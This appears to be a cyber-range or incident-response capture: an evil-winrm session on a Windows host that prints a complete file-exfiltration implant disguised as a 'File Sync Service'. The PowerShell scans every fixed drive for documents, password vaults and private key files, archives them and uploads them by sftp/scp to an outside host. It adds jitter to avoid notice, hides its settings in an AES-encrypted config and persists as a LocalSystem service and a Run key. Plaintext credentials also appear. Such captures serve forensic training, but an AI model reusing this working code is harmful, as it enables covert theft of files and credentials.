```
┌──(kali㉿dco-ops)-[~]
└─$ evil-winrm-py -i 172.16.3.7 -u administrator -p 'Simspace1!Simspace1!'
          _ _            _                             
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.5.0

[*] Connecting to '172.16.3.7:5985' as 'administrator'
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
  
evil-winrm-py PS C:\ProgramData\FileSync> dir
    Directory: C:\ProgramData\FileSync

Mode                 LastWriteTime         Length Name                                              
-a----         4/28/2026   1:11 PM          15291 file_sync.ps1                                     
-a----         4/28/2026   1:53 PM           1887 file_sync_service_runner.ps1                      
-a----         4/28/2026   1:55 PM           2261 install_file_sync_service.ps1                     
-a----         4/28/2026   2:54 PM           3228 new_encrypted_sync_config.ps1                     
-a----         4/28/2026   2:15 PM              0 SyncSvc.err.log                                   
-a----         4/28/2026   2:08 PM       18286774 SyncSvc.exe                                       
-a----         4/28/2026   2:15 PM              0 SyncSvc.out.log                                   
-a----         6/14/2026   9:34 PM           3229 SyncSvc.wrapper.log                               
-a----         4/28/2026   2:12 PM            642 SyncSvc.xml  
```

# file_sync.ps1
```
evil-winrm-py PS C:\ProgramData\FileSync> type file_sync.ps1
param(
    [string[]]$WatchDirs = @(),
    [string]$StateFile = "C:\ProgramData\file_sync_state.json",
    [string]$RemoteUser = "intake",
    [string]$RemoteHost = "198.51.100.200",
    [string]$RemoteDir = "/srv/intake/uploads",
    [string]$SshKeyPath = "C:\users\administrator\.ssh\id_ed25519",
    [string[]]$AllowedExtensions = @(".doc", ".docx", ".xls", ".xlsx", ".pdf", ".ppt", ".pptx", ".txt", ".csv", ".zip", ".rar", ".7z", ".kdbx", ".pfx", ".pem", ".key", ".ppk"),
    [string]$EncryptedConfigPath = "",
    [string]$ConfigPassphrase = "",
    [int]$RandomDelaySecondsMax = 0,
    [int]$MaxNewFilesPerRun = 25,
    [string]$StageDirectory = "C:\ProgramData\SyncCache",
    [ValidateSet("sftp", "scp")]
    [string]$TransferTool = "sftp"
)

Set-StrictMode -Version Latest
$ErrorActionPreference = "Stop"

function Get-NormalizedPath {
    param([string]$PathValue)
    try {
        return [System.IO.Path]::GetFullPath($PathValue).ToLowerInvariant()
    }
    catch {
        return $PathValue.ToLowerInvariant()
    }
}

function Get-AesPlainText {
    param(
        [string]$CipherTextBase64,
        [string]$SaltBase64,
        [string]$IvBase64,
        [string]$Passphrase
    )

    if ([string]::IsNullOrWhiteSpace($CipherTextBase64) -or [string]::IsNullOrWhiteSpace($SaltBase64) -or [string]::IsNullOrWhiteSpace($IvBase64)) {
        throw "Encrypted config is missing CipherTextBase64, SaltBase64, or IvBase64."
    }

    $cipher = [Convert]::FromBase64String($CipherTextBase64)
    $salt = [Convert]::FromBase64String($SaltBase64)
    $iv = [Convert]::FromBase64String($IvBase64)

    $kdf = New-Object System.Security.Cryptography.Rfc2898DeriveBytes($Passphrase, $salt, 10000)
    $key = $kdf.GetBytes(32)

    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $aes.Key = $key
    $aes.IV = $iv

    $decryptor = $aes.CreateDecryptor()
    try {
        $plainBytes = $decryptor.TransformFinalBlock($cipher, 0, $cipher.Length)
    }
    finally {
        $decryptor.Dispose()
        $aes.Dispose()
    }

    return [Text.Encoding]::UTF8.GetString($plainBytes)
}

function Import-EncryptedConfig {
    param(
        [string]$ConfigPath,
        [string]$Passphrase
    )

    if ([string]::IsNullOrWhiteSpace($ConfigPath)) {
        return $null
    }
    if (-not (Test-Path -LiteralPath $ConfigPath)) {
        throw "Encrypted config file not found: $ConfigPath"
    }
    if ([string]::IsNullOrWhiteSpace($Passphrase)) {
        throw "ConfigPassphrase is required when EncryptedConfigPath is set."
    }

    $raw = Get-Content -LiteralPath $ConfigPath -Raw
    $envelope = $raw | ConvertFrom-Json

    $plainJson = Get-AesPlainText -CipherTextBase64 $envelope.CipherTextBase64 -SaltBase64 $envelope.SaltBase64 -IvBase64 $envelope.IvBase64 -Passphrase $Passphrase
    return ($plainJson | ConvertFrom-Json)
}

function Load-State {
    param([string]$PathValue)

    if (-not (Test-Path -LiteralPath $PathValue)) {
        return @{}
    }

    $raw = Get-Content -LiteralPath $PathValue -Raw
    if ([string]::IsNullOrWhiteSpace($raw)) {
        return @{}
    }

    $parsed = $raw | ConvertFrom-Json
    $map = @{}
    if ($parsed -is [System.Collections.IEnumerable]) {
        foreach ($entry in $parsed) {
            if ($null -ne $entry.Path) {
                $map[$entry.Path] = $entry
            }
        }
    }
    return $map
}

function Get-ScanRoots {
    param([string[]]$ConfiguredDirs)

    if ($ConfiguredDirs -and $ConfiguredDirs.Count -gt 0) {
        return $ConfiguredDirs
    }

    $roots = @()
    foreach ($drive in [System.IO.DriveInfo]::GetDrives()) {
        if ($drive.DriveType -eq [System.IO.DriveType]::Fixed -and $drive.IsReady) {
            $roots += $drive.RootDirectory.FullName
        }
    }
    return $roots
}

function Save-State {
    param(
        [hashtable]$StateMap,
        [string]$PathValue
    )

    $parent = Split-Path -Path $PathValue -Parent
    if (-not [string]::IsNullOrWhiteSpace($parent) -and -not (Test-Path -LiteralPath $parent)) {
        New-Item -Path $parent -ItemType Directory -Force | Out-Null
    }

    $rows = foreach ($key in ($StateMap.Keys | Sort-Object)) {
        $StateMap[$key]
    }
    $rows | ConvertTo-Json -Depth 5 | Set-Content -LiteralPath $PathValue -Encoding UTF8
}

function Test-ShouldUpload {
    param(
        [pscustomobject]$FileEntry,
        [hashtable]$StateMap
    )

    $state = $StateMap[$FileEntry.Path]
    if ($null -eq $state) { return $true }
    if ($state.Hash -ne $FileEntry.Hash) { return $true }
    if ([int64]$state.Size -ne [int64]$FileEntry.Size) { return $true }
    if ($state.LastWriteUtc -ne $FileEntry.LastWriteUtc) { return $true }
    return $false
}

function Send-File {
    param(
        [string]$LocalPath,
        [string]$UserName,
        [string]$HostName,
        [string]$TargetDir,
        [string]$KeyPath,
        [string]$Tool
    )

    if ($Tool -eq "scp") {
        $scp = Get-Command scp.exe -ErrorAction SilentlyContinue
        if ($null -eq $scp) {
            throw "scp.exe not found. Install OpenSSH Client feature on Windows."
        }

        $args = @()
        if (-not [string]::IsNullOrWhiteSpace($KeyPath) -and (Test-Path -LiteralPath $KeyPath)) {
            $args += @("-i", $KeyPath)
        }
        $args += @($LocalPath, "$UserName@$HostName`:$TargetDir/")

        $output = & $scp.Source @args 2>&1
        if ($LASTEXITCODE -ne 0) {
            $msg = ($output | Out-String).Trim()
            if ([string]::IsNullOrWhiteSpace($msg)) { $msg = "Unknown scp failure." }
            throw $msg
        }
        return
    }

    $sftp = Get-Command sftp.exe -ErrorAction SilentlyContinue
    if ($null -eq $sftp) {
        throw "sftp.exe not found. Install OpenSSH Client feature on Windows."
    }

    $batchLines = @(
        "put `"$LocalPath`" `"$TargetDir/`""
    )
    $batchPath = Join-Path -Path $env:TEMP -ChildPath ("sftp_batch_" + [guid]::NewGuid().ToString("N") + ".txt")
    $batchLines | Set-Content -LiteralPath $batchPath -Encoding ASCII

    $args = @("-b", $batchPath)
    if (-not [string]::IsNullOrWhiteSpace($KeyPath) -and (Test-Path -LiteralPath $KeyPath)) {
        $args += @("-i", $KeyPath)
    }
    $args += @("$UserName@$HostName")

    try {
        $output = & $sftp.Source @args 2>&1
        if ($LASTEXITCODE -ne 0) {
            $msg = ($output | Out-String).Trim()
            if ([string]::IsNullOrWhiteSpace($msg)) { $msg = "Unknown sftp failure." }
            throw $msg
        }
    }
    finally {
        if (Test-Path -LiteralPath $batchPath) {
            Remove-Item -LiteralPath $batchPath -Force -ErrorAction SilentlyContinue
        }
    }
}

function New-RunArchive {
    param(
        [System.Collections.ArrayList]$Items,
        [string]$StageRoot
    )

    $runId = [DateTime]::UtcNow.ToString("yyyyMMdd_HHmmss")
    $hostTag = $env:COMPUTERNAME
    if ([string]::IsNullOrWhiteSpace($hostTag)) {
        $hostTag = "host"
    }

    if (-not (Test-Path -LiteralPath $StageRoot)) {
        New-Item -Path $StageRoot -ItemType Directory -Force | Out-Null
    }

    $workDir = Join-Path -Path $StageRoot -ChildPath ("stage_" + $runId)
    New-Item -Path $workDir -ItemType Directory -Force | Out-Null

    $manifestRows = New-Object System.Collections.ArrayList
    $index = 0

    foreach ($item in $Items) {
        $index++
        $leaf = [System.IO.Path]::GetFileName($item.SourcePath)
        $safeLeaf = "$index" + "__" + $leaf
        $destPath = Join-Path -Path $workDir -ChildPath $safeLeaf
        Copy-Item -LiteralPath $item.SourcePath -Destination $destPath -Force

        [void]$manifestRows.Add([pscustomobject]@{
            OriginalPath = $item.Path
            PackedName   = $safeLeaf
            LastWriteUtc = $item.LastWriteUtc
            Size         = $item.Size
            Hash         = $item.Hash
        })
    }

    $manifestPath = Join-Path -Path $workDir -ChildPath "manifest.json"
    $manifestRows | ConvertTo-Json -Depth 5 | Set-Content -LiteralPath $manifestPath -Encoding UTF8

    $archiveName = "$hostTag" + "_" + $runId + ".zip"
    $archivePath = Join-Path -Path $StageRoot -ChildPath $archiveName
    if (Test-Path -LiteralPath $archivePath) {
        Remove-Item -LiteralPath $archivePath -Force
    }

    Compress-Archive -Path (Join-Path -Path $workDir -ChildPath "*") -DestinationPath $archivePath -CompressionLevel Optimal

    Remove-Item -LiteralPath $workDir -Recurse -Force
    return $archivePath
}

$config = Import-EncryptedConfig -ConfigPath $EncryptedConfigPath -Passphrase $ConfigPassphrase
if ($null -ne $config) {
    if ($null -ne $config.WatchDirs -and $config.WatchDirs.Count -gt 0) { $WatchDirs = @($config.WatchDirs) }
    if (-not [string]::IsNullOrWhiteSpace($config.StateFile)) { $StateFile = [string]$config.StateFile }
    if (-not [string]::IsNullOrWhiteSpace($config.RemoteUser)) { $RemoteUser = [string]$config.RemoteUser }
    if (-not [string]::IsNullOrWhiteSpace($config.RemoteHost)) { $RemoteHost = [string]$config.RemoteHost }
    if (-not [string]::IsNullOrWhiteSpace($config.RemoteDir)) { $RemoteDir = [string]$config.RemoteDir }
    if ($null -ne $config.AllowedExtensions -and $config.AllowedExtensions.Count -gt 0) { $AllowedExtensions = @($config.AllowedExtensions) }
    if (-not [string]::IsNullOrWhiteSpace($config.SshKeyPath)) { $SshKeyPath = [string]$config.SshKeyPath }
    if ($null -ne $config.RandomDelaySecondsMax) { $RandomDelaySecondsMax = [int]$config.RandomDelaySecondsMax }
    if ($null -ne $config.MaxNewFilesPerRun) { $MaxNewFilesPerRun = [int]$config.MaxNewFilesPerRun }
    if (-not [string]::IsNullOrWhiteSpace($config.StageDirectory)) { $StageDirectory = [string]$config.StageDirectory }
    if (-not [string]::IsNullOrWhiteSpace($config.TransferTool)) { $TransferTool = [string]$config.TransferTool }
}

if ($RandomDelaySecondsMax -gt 0) {
    $delay = Get-Random -Minimum 0 -Maximum ($RandomDelaySecondsMax + 1)
    if ($delay -gt 0) {
        Write-Host "[JITTER] Sleeping $delay second(s) before scan."
        Start-Sleep -Seconds $delay
    }
}

$extSet = @{}
foreach ($ext in $AllowedExtensions) {
    if (-not [string]::IsNullOrWhiteSpace($ext)) {
        $extSet[$ext.ToLowerInvariant()] = $true
    }
}

$isBootstrap = -not (Test-Path -LiteralPath $StateFile)
$state = Load-State -PathValue $StateFile
$scanRoots = @(Get-ScanRoots -ConfiguredDirs $WatchDirs)

if ($scanRoots.Count -eq 0) {
    throw "No scan roots found. Provide -WatchDirs explicitly."
}

$uploaded = 0
$skipped = 0
$failed = 0
$cataloged = 0
$newCandidates = New-Object System.Collections.ArrayList

foreach ($dir in $scanRoots) {
    if (-not (Test-Path -LiteralPath $dir)) {
        Write-Warning "Watch dir not found: $dir"
        continue
    }

    Get-ChildItem -LiteralPath $dir -File -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
        $ext = $_.Extension.ToLowerInvariant()
        if (-not $extSet.ContainsKey($ext)) {
            return
        }

        $fullPath = Get-NormalizedPath -PathValue $_.FullName
        $lastWriteUtc = $_.LastWriteTimeUtc.ToString("o")
        $size = [int64]$_.Length

        try {
            $hash = (Get-FileHash -LiteralPath $_.FullName -Algorithm SHA256).Hash.ToLowerInvariant()
        }
        catch {
            $failed++
            Write-Host "[FAILED HASH] $($_.FullName) :: $($_.Exception.Message)"
            return
        }

        $entry = [pscustomobject]@{
            Path         = $fullPath
            LastWriteUtc = $lastWriteUtc
            Size         = $size
            Hash         = $hash
        }

        if ($isBootstrap) {
            $cataloged++
            $state[$entry.Path] = [pscustomobject]@{
                Path         = $entry.Path
                LastWriteUtc = $entry.LastWriteUtc
                Size         = $entry.Size
                Hash         = $entry.Hash
                LastUploaded = $null
                FirstSeenUtc = [DateTime]::UtcNow.ToString("o")
            }
            if (($cataloged % 1000) -eq 0) {
                Write-Host "[CATALOG] Added $cataloged files so far..."
            }
            return
        }

        if ($state.ContainsKey($entry.Path)) {
            # Existing file path is known from baseline or previous runs.
            # Keep metadata fresh but do not upload; only new file paths are uploaded.
            $existing = $state[$entry.Path]
            $state[$entry.Path] = [pscustomobject]@{
                Path         = $entry.Path
                LastWriteUtc = $entry.LastWriteUtc
                Size         = $entry.Size
                Hash         = $entry.Hash
                LastUploaded = $existing.LastUploaded
                FirstSeenUtc = $existing.FirstSeenUtc
            }
            $skipped++
            return
        }

        $candidate = [pscustomobject]@{
            Path         = $entry.Path
            SourcePath   = $_.FullName
            LastWriteUtc = $entry.LastWriteUtc
            Size         = $entry.Size
            Hash         = $entry.Hash
        }
        [void]$newCandidates.Add($candidate)
    }
}

if (-not $isBootstrap -and $newCandidates.Count -gt 0) {
    $selected = New-Object System.Collections.ArrayList
    $takeCount = [Math]::Min($newCandidates.Count, [Math]::Max($MaxNewFilesPerRun, 1))
    for ($i = 0; $i -lt $takeCount; $i++) {
        [void]$selected.Add($newCandidates[$i])
    }

    try {
        $archivePath = New-RunArchive -Items $selected -StageRoot $StageDirectory
        Send-File -LocalPath $archivePath -UserName $RemoteUser -HostName $RemoteHost -TargetDir $RemoteDir -KeyPath $SshKeyPath -Tool $TransferTool
        $uploaded = $selected.Count
        foreach ($item in $selected) {
            $state[$item.Path] = [pscustomobject]@{
                Path         = $item.Path
                LastWriteUtc = $item.LastWriteUtc
                Size         = $item.Size
                Hash         = $item.Hash
                LastUploaded = [DateTime]::UtcNow.ToString("o")
                FirstSeenUtc = [DateTime]::UtcNow.ToString("o")
            }
        }
        Write-Host "[UPLOADED ARCHIVE] $archivePath (files=$($selected.Count))"
    }
    catch {
        $failed++
        Write-Host "[FAILED ARCHIVE UPLOAD] $($_.Exception.Message)"
    }
}

Save-State -StateMap $state -PathValue $StateFile
if ($isBootstrap) {
    Write-Host "Baseline catalog complete. Cataloged=$cataloged Failed=$failed StateFile=$StateFile"
}
else {
    $pending = [Math]::Max($newCandidates.Count - $uploaded, 0)
    Write-Host "Done. Uploaded=$uploaded Pending=$pending Skipped=$skipped Failed=$failed StateFile=$StateFile"
}

```

# file_sync_service_runner.ps1
```
evil-winrm-py PS C:\ProgramData\FileSync> type file_sync_service_runner.ps1
param(
    [Parameter(Mandatory = $true)]
    [string]$SyncScriptPath,
    [Parameter(Mandatory = $true)]
    [string]$EncryptedConfigPath,
    [Parameter(Mandatory = $true)]
    [string]$ConfigPassphrase,
    [int]$IntervalSeconds = 600,
    [string]$LogPath = "C:\ProgramData\SyncCache\service.log"
)

Set-StrictMode -Version Latest
$ErrorActionPreference = "Continue"

function Write-ServiceLog {
    param([string]$Message)

    $parent = Split-Path -Path $LogPath -Parent
    if (-not [string]::IsNullOrWhiteSpace($parent) -and -not (Test-Path -LiteralPath $parent)) {
        New-Item -Path $parent -ItemType Directory -Force | Out-Null
    }

    $line = "[{0}] {1}" -f ([DateTime]::UtcNow.ToString("o")), $Message
    Add-Content -LiteralPath $LogPath -Value $line -Encoding UTF8
}

if (-not (Test-Path -LiteralPath $SyncScriptPath)) {
    throw "Sync script not found: $SyncScriptPath"
}
if (-not (Test-Path -LiteralPath $EncryptedConfigPath)) {
    throw "Encrypted config not found: $EncryptedConfigPath"
}

if ($IntervalSeconds -lt 30) {
    $IntervalSeconds = 30
}

Write-ServiceLog "Service runner starting. IntervalSeconds=$IntervalSeconds"

while ($true) {
    try {
        Write-ServiceLog "Starting sync cycle."
        & powershell.exe -NoProfile -ExecutionPolicy Bypass -File $SyncScriptPath -EncryptedConfigPath $EncryptedConfigPath -ConfigPassphrase $ConfigPassphrase 2>&1 | ForEach-Object {
            Write-ServiceLog "$_"
        }
        if ($LASTEXITCODE -ne 0) {
            Write-ServiceLog "Sync cycle finished with non-zero exit code: $LASTEXITCODE"
        }
        else {
            Write-ServiceLog "Sync cycle completed successfully."
        }
    }
    catch {
        Write-ServiceLog ("Sync cycle exception: " + $_.Exception.Message)
    }

    Start-Sleep -Seconds $IntervalSeconds
}

```

# install_file_sync_service.ps1
```
evil-winrm-py PS C:\ProgramData\FileSync> type install_file_sync_service.ps1
param(
    [string]$ServiceName = "SyncSvc",
    [string]$DisplayName = "File Sync Service",
    [string]$Description = "Runs file sync cycles.",
    [string]$SyncScriptPath = "",
    [string]$RunnerScriptPath = "",
    [Parameter(Mandatory = $true)]
    [string]$EncryptedConfigPath,
    [Parameter(Mandatory = $true)]
    [string]$ConfigPassphrase,
    [int]$IntervalSeconds = 600,
    [string]$ServiceAccount = "LocalSystem"
)

Set-StrictMode -Version Latest
$ErrorActionPreference = "Stop"

if ([string]::IsNullOrWhiteSpace($PSScriptRoot)) {
    $scriptDir = Split-Path -Path $MyInvocation.MyCommand.Path -Parent
}
else {
    $scriptDir = $PSScriptRoot
}

if ([string]::IsNullOrWhiteSpace($SyncScriptPath)) {
    $SyncScriptPath = Join-Path -Path $scriptDir -ChildPath "file_sync.ps1"
}
if ([string]::IsNullOrWhiteSpace($RunnerScriptPath)) {
    $RunnerScriptPath = Join-Path -Path $scriptDir -ChildPath "file_sync_service_runner.ps1"
}

if (-not (Test-Path -LiteralPath $SyncScriptPath)) {
    throw "Sync script not found: $SyncScriptPath"
}
if (-not (Test-Path -LiteralPath $RunnerScriptPath)) {
    throw "Runner script not found: $RunnerScriptPath"
}
if (-not (Test-Path -LiteralPath $EncryptedConfigPath)) {
    throw "Encrypted config not found: $EncryptedConfigPath"
}

$existing = Get-Service -Name $ServiceName -ErrorAction SilentlyContinue
if ($null -ne $existing) {
    throw "Service '$ServiceName' already exists. Remove it first or use a different name."
}

$binaryPath = "powershell.exe -NoProfile -ExecutionPolicy Bypass -File `"$RunnerScriptPath`" -SyncScriptPath `"$SyncScriptPath`" -EncryptedConfigPath `"$EncryptedConfigPath`" -ConfigPassphrase `"$ConfigPassphrase`" -IntervalSeconds $IntervalSeconds"

New-Service -Name $ServiceName -BinaryPathName $binaryPath -DisplayName $DisplayName -Description $Description -StartupType Automatic

# Restrict service account choice for safe defaults; LocalSystem is default for lab convenience.
if ($ServiceAccount -ne "LocalSystem") {
    Write-Warning "Non-default service account requested. Update service logon account manually if needed."
}

Start-Service -Name $ServiceName
Write-Host "Service '$ServiceName' installed and started."

```

# new_encrypted_sync_config.ps1
```
evil-winrm-py PS C:\ProgramData\FileSync> type new_encrypted_sync_config.ps1
param(
    [Parameter(Mandatory = $true)]
    [string]$OutputPath,
    [Parameter(Mandatory = $true)]
    [string]$Passphrase,
    [string]$StateFile = "C:\ProgramData\file_sync_state.json",
    [string]$RemoteUser = "intake",
    [string]$RemoteHost = "198.51.100.200",
    [string]$RemoteDir = "/srv/intake/uploads",
    [string]$SshKeyPath = "C:\Windows\system32\config\systemprofile\.ssh\id_ed25519",
    [string[]]$AllowedExtensions = @(".doc", ".docx", ".xls", ".xlsx", ".pdf", ".ppt", ".pptx", ".txt", ".csv", ".zip", ".rar", ".7z", ".kdbx", ".pfx", ".pem", ".key", ".ppk"),
    [string[]]$WatchDirs = @(),
    [int]$RandomDelaySecondsMax = 120,
    [int]$MaxNewFilesPerRun = 25,
    [string]$StageDirectory = "C:\ProgramData\SyncCache",
    [ValidateSet("sftp", "scp")]
    [string]$TransferTool = "sftp"
)

Set-StrictMode -Version Latest
$ErrorActionPreference = "Stop"

function Protect-AesPlainText {
    param(
        [string]$PlainText,
        [string]$Passphrase
    )

    $salt = New-Object byte[] 16
    $iv = New-Object byte[] 16
    [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($salt)
    [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($iv)

    $kdf = New-Object System.Security.Cryptography.Rfc2898DeriveBytes($Passphrase, $salt, 10000)
    $key = $kdf.GetBytes(32)

    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $aes.Key = $key
    $aes.IV = $iv

    $encryptor = $aes.CreateEncryptor()
    try {
        $plainBytes = [Text.Encoding]::UTF8.GetBytes($PlainText)
        $cipherBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
    }
    finally {
        $encryptor.Dispose()
        $aes.Dispose()
    }

    return [pscustomobject]@{
        CipherTextBase64 = [Convert]::ToBase64String($cipherBytes)
        SaltBase64       = [Convert]::ToBase64String($salt)
        IvBase64         = [Convert]::ToBase64String($iv)
        Kdf              = "PBKDF2-SHA1-10000"
        Cipher           = "AES-256-CBC"
    }
}

$config = [pscustomobject]@{
    WatchDirs             = $WatchDirs
    StateFile             = $StateFile
    RemoteUser            = $RemoteUser
    RemoteHost            = $RemoteHost
    RemoteDir             = $RemoteDir
    SshKeyPath            = $SshKeyPath
    AllowedExtensions     = $AllowedExtensions
    RandomDelaySecondsMax = $RandomDelaySecondsMax
    MaxNewFilesPerRun     = $MaxNewFilesPerRun
    StageDirectory        = $StageDirectory
    TransferTool          = $TransferTool
}

$plainJson = $config | ConvertTo-Json -Depth 5
$envelope = Protect-AesPlainText -PlainText $plainJson -Passphrase $Passphrase

$parent = Split-Path -Path $OutputPath -Parent
if (-not [string]::IsNullOrWhiteSpace($parent) -and -not (Test-Path -LiteralPath $parent)) {
    New-Item -Path $parent -ItemType Directory -Force | Out-Null
}

$envelope | ConvertTo-Json -Depth 5 | Set-Content -LiteralPath $OutputPath -Encoding UTF8
Write-Host "Encrypted config written to $OutputPath"

```

# SyncSvc.err.log
```
<empty>
```

# SyncSvc.out.log
```
<empty>
```

# SyncSvc.wrapper.log
```
evil-winrm-py PS C:\ProgramData\FileSync> type SyncSvc.wrapper.log
2026-04-30T08:54:47.402 WARN  service - Child process 'powershell (5404)' finished with code 1.
2026-04-30T09:04:44.860 DEBUG console - Starting WinSW in service mode.
2026-04-30T09:04:45.086 INFO  console - Service 'File Sync Service (SyncSvc)' was refreshed successfully.
2026-04-30T09:04:45.116 INFO  service - Starting powershell.exe
2026-04-30T09:04:45.181 INFO  service - Started process powershell (4372).
2026-04-30T09:04:45.227 INFO  service - Service started successfully.
2026-04-30T15:00:26.585 WARN  service - Child process 'powershell (4372)' finished with code 1.
2026-04-30T15:14:50.494 DEBUG console - Starting WinSW in service mode.
2026-04-30T15:14:50.581 INFO  console - Service 'File Sync Service (SyncSvc)' was refreshed successfully.
2026-04-30T15:14:50.610 INFO  service - Starting powershell.exe
2026-04-30T15:14:50.762 INFO  service - Started process powershell (4264).
2026-04-30T15:14:50.803 INFO  service - Service started successfully.
2026-06-09T08:43:20.486 DEBUG console - Starting WinSW in service mode.
2026-06-09T08:43:22.069 INFO  console - Service 'File Sync Service (SyncSvc)' was refreshed successfully.
2026-06-09T08:43:22.099 INFO  service - Starting powershell.exe
2026-06-09T08:43:22.226 INFO  service - Started process powershell (3380).
2026-06-09T08:43:22.396 INFO  service - Service started successfully.
2026-06-09T09:41:22.155 WARN  service - Child process 'powershell (3380)' finished with code 1.
2026-06-09T09:42:00.109 DEBUG console - Starting WinSW in service mode.
2026-06-09T09:42:00.252 INFO  console - Service 'File Sync Service (SyncSvc)' was refreshed successfully.
2026-06-09T09:42:00.288 INFO  service - Starting powershell.exe
2026-06-09T09:42:00.385 INFO  service - Started process powershell (4860).
2026-06-09T09:42:00.443 INFO  service - Service started successfully.
2026-06-10T09:04:38.721 DEBUG console - Starting WinSW in service mode.
2026-06-10T09:04:38.819 INFO  console - Service 'File Sync Service (SyncSvc)' was refreshed successfully.
2026-06-10T09:04:38.855 INFO  service - Starting powershell.exe
2026-06-10T09:04:38.900 INFO  service - Started process powershell (4928).
2026-06-10T09:04:38.943 INFO  service - Service started successfully.
2026-06-12T12:15:56.825 WARN  service - Child process 'powershell (4928)' finished with code 1.
2026-06-12T13:41:20.543 DEBUG console - Starting WinSW in service mode.
2026-06-12T13:41:20.615 INFO  console - Service 'File Sync Service (SyncSvc)' was refreshed successfully.
2026-06-12T13:41:20.646 INFO  service - Starting powershell.exe
2026-06-12T13:41:20.726 INFO  service - Started process powershell (3756).
2026-06-12T13:41:20.782 INFO  service - Service started successfully.
2026-06-13T12:55:03.779 WARN  service - Child process 'powershell (3756)' finished with code 1.
2026-06-14T21:34:50.632 DEBUG console - Starting WinSW in service mode.
2026-06-14T21:34:50.738 INFO  console - Service 'File Sync Service (SyncSvc)' was refreshed successfully.
2026-06-14T21:34:50.780 INFO  service - Starting powershell.exe
2026-06-14T21:34:50.849 INFO  service - Started process powershell (3812).
2026-06-14T21:34:50.893 INFO  service - Service started successfully.

```

# SyncSvc.xml
```
evil-winrm-py PS C:\ProgramData\FileSync> type SyncSvc.xml
<service>
  <id>SyncSvc</id>
  <name>File Sync Service</name>
  <description>Runs file_sync.ps1 periodically</description>
  <executable>powershell.exe</executable>
  <arguments>-NoProfile -ExecutionPolicy Bypass -File "C:\ProgramData\FileSync\file_sync_service_runner.ps1" -SyncScriptPath "C:\ProgramData\FileSync\file_sync.ps1" -EncryptedConfigPath "C:\ProgramData\sync_config.enc.json" -ConfigPassphrase "Counterstrike-Capstone" -IntervalSeconds 600</arguments>
  <log mode="roll-by-size">
    <sizeThreshold>10240</sizeThreshold>
    <keepFiles>5</keepFiles>
  </log>
  <onfailure action="restart" delay="10 sec"/>
</service>

```

# Reg Key
```
evil-winrm-py PS C:\windows\system32\tasks> reg query HKEY_LOCAL_MACHINE\software\microsoft\windows\currentversion\run

OfficeUpdateAgent    REG_SZ    C:\Users\Public\Libraries\Agent.exe

```

# c:\programdata\file_sync_state.json
```
<BREAK>
    
    {
        "Path":  "c:\\windows\\winsxs\\wow64_microsoft-windows-t..tional-chinese-dayi_31bf3856ad364e35_10.0.19041.1_none_20c1c94bb9595c32\\tabletextservicedayi.txt",
        "LastWriteUtc":  "2019-12-07T09:10:04.1629521Z",
        "Size":  980224,
        "Hash":  "22932611428065343faa8f8241bbea120638758923f1fa8a752d0493f12003b6",
        "LastUploaded":  null,
        "FirstSeenUtc":  "2026-04-28T15:53:48.5335234Z"
    },
    {
        "Path":  "c:\\windows\\winsxs\\wow64_microsoft-windows-windowscodecraw_31bf3856ad364e35_10.0.19041.2251_none_140f630ca14effba\\windowscodecsraw.txt",
        "LastWriteUtc":  "2019-12-07T09:10:08.9131874Z",
        "Size":  1649,
        "Hash":  "6e422654148bd675b224e1d7de0033bdd711db3e07d3f3fd0e5c871301d491c5",
        "LastUploaded":  null,
        "FirstSeenUtc":  "2026-04-28T15:53:48.8779417Z"
    },
    {
        "Path":  "c:\\windows\\winsxs\\wow64_multimedia-generalmididata_31bf3856ad364e35_10.0.19041.1_none_490303a12a215bda\\gmreadme.txt",
        "LastWriteUtc":  "2019-12-07T09:09:11.8799672Z",
        "Size":  646,
        "Hash":  "10bf6e15c08c8c7f5d96b658bab78aed86d1de20f08e7871eefba0939af11a02",
        "LastUploaded":  null,
        "FirstSeenUtc":  "2026-04-28T15:53:49.1741357Z"
    },
    {
        "Path":  "c:\\windows\\winsxs\\x86_netfx4-attributionfile_b03f5f7f11d50a3a_4.0.15805.0_none_bdecefa7687adc22\\thirdpartynotices.txt",
        "LastWriteUtc":  "2019-12-07T09:10:48.6334731Z",
        "Size":  61714,
        "Hash":  "de857de6afd5cee75c12b56f0f9522675623352df6d9d5a7a228062140aa77c1",
        "LastUploaded":  null,
        "FirstSeenUtc":  "2026-04-28T15:53:50.8930730Z"
    }
]

```

# sync_config.enc.json
```
evil-winrm-py PS C:\programdata> type sync_config.enc.json
{
